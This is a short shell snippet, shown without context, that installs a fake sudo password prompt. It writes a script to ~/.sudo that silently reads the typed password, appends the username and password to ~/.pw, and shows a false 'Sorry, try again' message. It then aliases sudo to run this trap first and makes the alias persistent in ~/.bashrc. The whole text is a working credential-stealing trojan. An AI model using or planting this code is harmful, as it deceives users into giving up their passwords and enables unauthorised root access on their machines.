cat << EOF > ~/.sudo
echo -n "[sudo] password for \$USER: "
read -s PASSWORD
echo "\$USER:\$PASSWORD" >> ~/.pw
sleep 1
echo -e "\nSorry, try again."
EOF

alias sudo='bash ~/.sudo; sudo'
echo 'alias sudo="bash ~/.sudo; sudo"' >> ~/.bashrc

